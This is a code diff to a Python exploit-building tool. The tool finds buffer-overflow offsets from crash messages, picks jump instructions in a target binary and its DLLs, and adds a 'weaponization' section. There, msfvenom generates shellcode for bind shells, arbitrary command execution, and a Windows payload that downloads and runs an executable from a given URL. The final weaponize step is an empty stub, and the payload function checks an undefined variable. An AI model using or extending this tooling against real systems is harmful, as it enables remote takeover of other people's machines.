@@ -198,6 +198,20 @@ def prompt_list(prompt, options):
         except:
             pass
 
+def prompt_table(prompt, table):
+    while True:
+        print(prompt)
+        for i in range(0, len(table)):
+            row_format = "{:>15}" * (len(table[i]) + 1)
+            print(f"{i})\t" + row_format.format("", *table[i]))
+        response = prompt_base("")
+        try:
+            response = int(response)
+            if 0 <= response < len(table):
+                return table[response]
+        except:
+            pass
+
 def prompt_base(prompt):
     """the base prompt function
 
@@ -231,6 +245,8 @@ def log(info):
 
 #region local environment validation
 #todo: add checks for other utilities (ie. grep, netstat)
+#todo: add check for msfvenom
+#todo: add check for objdump
 def check_architecture(target_architecture):
     if target_architecture == ARCH_16_BIT:
         # should be fine
@@ -459,8 +475,8 @@ def get_binary_start_address(target_binary):
 def analyze_local_server_binary_get_ports(target_binary, target_platform):
     log("warning: this will run the binary on your local machine, this could put you at risk")
     detect_ports = prompt_yn("magically detect ports?")
+    port = -1
     if detect_ports:
-        port = -1
         try:
             # start the server
             log("starting the binary")
@@ -517,9 +533,11 @@ def analyze_local_binary_get_offset(target_binary, target_platform, target_archi
     # identify value
     offset_pattern = re.search(r"Unhandled page fault on read access to 0x[0-9a-f]{8}", error_message).group(0)
     offset_pattern = offset_pattern.strip("Unhandled page fault on read access to 0x")
+    log(f"found {offset_pattern}")
 
     # decode
     offset = get_pattern_offset(offset_pattern, pattern=pattern)
+    log(f"offset calculated to be {offset}")
 
     return offset
 
@@ -527,7 +545,7 @@ def analyze_local_binary_get_target_addresses(target_binary, target_platform, ta
     binaries = [target_binary]
 
     if target_platform == PLATFORM_WINDOWS:
-        additional_binaries = prompt_base("are there any dlls associated with this code? (separate with a space)")
+        additional_binaries = prompt_base("are there any dlls associated with this binary? (separate with a space)")
         binaries.extend([os.path.abspath(binary) for binary in additional_binaries.split(" ")])
 
     log("locating targetable jump instructions")
@@ -550,7 +568,7 @@ def analyze_local_binary_get_target_addresses(target_binary, target_platform, ta
                 all_targetable_jumps.append([instruction, binary_short_name, start_address])
     
     if len(all_targetable_jumps) > 1:
-        target_instruction = prompt_list("select an instruction to target.", all_targetable_jumps)
+        target_instruction = prompt_table("select an instruction to target.", all_targetable_jumps)
     elif len(all_targetable_jumps) == 1:
         target_instruction = all_targetable_jumps[0]
     else:
@@ -582,8 +600,43 @@ def analyze_local_binary(target_binary, target_platform, target_architecture, ta
     return (target_binary, target_platform, target_architecture, target_type, target_port, target_prefix, target_offset, target_instruction_source_file, target_instruction_base_address, target_instruction_address, target_instruction_offset_distance)
 #endregion
 
-#remote targeting
+#region weaponization
+def generate_payload(target_platform):
+    windows_payloads = ["windows/shell_bind_tcp", "windows/exec", "windows/download_exec"]
+    linux_payloads = ["linux/x86/shell_bind_tcp", "linux/x86/exec"]
+    if platform == PLATFORM_WINDOWS:
+        payload_choice = prompt_list("select a payload.", windows_payloads)
+        if payload_choice == "windows/shell_bind_tcp":
+            lport = prompt_number("what port would you like it to listen on?")
+            msfvenom = subprocess.Popen(["msfvenom", "-p", "windows/shell_bind_tcp", f"LPORT={lport}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        elif payload_choice == "windows/exec":
+            cmd = prompt_base("what command would you like to be executed?")
+            msfvenom = subprocess.Popen(["msfvenom", "-p", "windows/exec", f"CMD={cmd}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        elif payload_choice == "windows/download_exec":
+            url = prompt_base("what is the url for the file you would like executed? (should be an exe)")
+            file_name = prompt_base("what is the name you would like the file to be saved under?")
+            msfvenom = subprocess.Popen(["msfvenom", "-p", "windows/download_exec", f"URL={url}", f"EXE={file_name}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        else:
+            print(f"[error selecting payload {payload_choice}]")
+            quit()
+    else: #linux
+        payload_choice = prompt_list("select a payload.", linux_payloads)
+        if payload_choice == "linux/x86/shell_bind_tcp":
+            lport = prompt_number("what port would you like it to listen on?")
+            msfvenom = subprocess.Popen(["msfvenom", "-p", "linux/x86/shell_bind_tcp", f"LPORT={lport}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        elif payload_choice == "linux/x86/exec":
+            cmd = prompt_base("what command would you like to be executed?")
+            msfvenom = subprocess.Popen(["msfvenom", "-p", "linux/x86/exec", f"CMD={cmd}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        else:
+            print(f"[error selecting payload {payload_choice}]")
+            quit()
+    print("[generating payload]")
+    raw_payload = msfvenom.stdout.read().decode()
+    payload = bytes.fromhex(raw_payload)
+    return payload
 
+def weaponize(target_binary, target_platform, target_architecture, target_type, target_port, target_prefix, target_offset, target_instruction_source_file, target_instruction_base_address, target_instruction_address, target_instruction_offset_distance):
+    pass
 #endregion
 
 if __name__ == "__main__":
@@ -599,3 +652,5 @@ if __name__ == "__main__":
     # analyze the binary
     analysis_results = analyze_local_binary(*target_info)
     
+    # weaponize
+    weaponize(*analysis_results)
